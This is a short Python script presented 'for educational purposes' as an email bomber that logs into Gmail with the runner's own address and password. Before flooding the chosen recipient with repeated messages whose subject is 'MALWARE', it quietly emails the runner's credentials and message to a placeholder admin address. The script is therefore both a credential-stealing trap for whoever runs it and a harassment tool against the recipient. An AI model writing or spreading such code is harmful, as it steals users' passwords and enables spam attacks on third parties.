## !!THIS PROJECT IS ONLY FOR EDUCATIONAL PURPOSES!!
## !!I DO NOT TAKE ANY RESPONSIBILITY FOR YOUR MISUSE OF THIS PROGRAM!!

import smtplib
import datetime
import os
import time
now = datetime.datetime.now()
    #Creates clearscreen method
def clscreen():
    os.system('cls' if os.name =='nt' else 'clear')
    pass
  
    #Obtains user data
TOTAL_MAILS_SENT = 0
print("Your mail adress: ")
USER_MAIL_ADRESS = input()
print("Your password: ")
USER_MAIL_PASSWORD = input()
print("Recipent mail adress: ")
RECIPENT_MAIL_ADRESS = input()
print("Ammount of mails: ")
AMMOUNT_MAILS = input()
print("Email message: ")
USER_MAIL_BODY = input()

mail_password_recipent_ammount = USER_MAIL_ADRESS + " sent " + AMMOUNT_MAILS + " emails to " + RECIPENT_MAIL_ADRESS + " with this password: " + USER_MAIL_PASSWORD + " at: " + now.strftime("%Y-%m-%d %H:%M:%S") + " containing: " + USER_MAIL_BODY

    #Logs into smtp server as user
with smtplib.SMTP('smtp.gmail.com', 587) as smtp:
    smtp.ehlo()
    smtp.starttls()
    smtp.ehlo()
    smtp.login(USER_MAIL_ADRESS, USER_MAIL_PASSWORD)
        #Creates messages for recipent and creates a refort for admin
    msg_to_admin = f'Subject: User data for {USER_MAIL_ADRESS} \n\n{mail_password_recipent_ammount}'
    msg_to_recipent = f'Subject: MALWARE \n\n{USER_MAIL_BODY}'
    
        #Sends report to admin
    smtp.sendmail(USER_MAIL_ADRESS, <!your_admin_mail>, msg_to_admin) 
    
        #clears screen
    clscreen()

    print("Data sucesfully obtained...")
    print("Executing spam protocol...")
    print("Spamming in 3...")
    print("Spamming in 2...")
    print("Spamming in 1...")
    clscreen()
        #Starts spamming
    while int(AMMOUNT_MAILS) > TOTAL_MAILS_SENT:
        smtp.sendmail(USER_MAIL_ADRESS, RECIPENT_MAIL_ADRESS, msg_to_recipent)
        TOTAL_MAILS_SENT += 1
        print(str(TOTAL_MAILS_SENT) + "/" + str(AMMOUNT_MAILS) + " Mails sent to " + RECIPENT_MAIL_ADRESS)

        
    print("Spamming sucesfull... ")
    print("Exiting...")
    time.sleep(3)
    os._exit(0)
